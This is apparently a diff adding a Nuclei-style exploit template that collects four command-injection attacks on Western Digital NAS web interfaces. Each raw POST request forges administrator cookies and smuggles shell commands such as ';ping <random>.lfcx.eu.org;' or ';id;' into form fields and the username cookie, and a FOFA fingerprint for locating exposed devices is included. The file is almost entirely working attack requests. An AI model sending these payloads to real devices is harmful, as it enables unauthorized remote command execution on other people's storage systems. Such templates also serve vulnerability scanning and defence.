@@ -1,0 +1,116 @@
+id: poc-vt4yxviv4z3vgsi7
+info:
+  name: 西部数据命令执行漏洞合集
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vt4yxviv4z3vgsi7'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vt4yxviv4z3vgsi7
+    fofa: icon_hash="-1074357885"
+http:
+- raw:
+  - 'POST /web/backups/internal_backup.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Cookie: isAdmin=1; username=admin
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 8
+
+
+    action=go_jobs&taskname='';ping fycuookhjw.lfcx.eu.org;''
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934383-50f138dc-d725-41d8-b710-e62970077241.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /web/setting/recycle_bin.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Cookie: isAdmin=1; username=";ping laiwzagzrg.lfcx.eu.org;"
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 8
+
+
+    action=save&enable_auto_clear=";ping laiwzagzrg.lfcx.eu.org;"&clear_days=1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934635-7473d1f7-a1b0-40e2-9dc5-c4ef433f3a1f.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /web/google_analytics.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Cookie: isAdmin=1; username=admin
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 8
+
+
+    cmd=set&opt=;id;&arg=1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934887-105aa836-e571-440a-9050-9bb28d441fba.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /web/php/noHDD.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Cookie: isAdmin=1; username=admin;
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 30
+
+
+    cmd=setSataPower&enable=";ping zhxoimzfrw.yutu.eu.org;"
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013935298-4d296181-5b76-4493-8185-edbe2877a29f.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
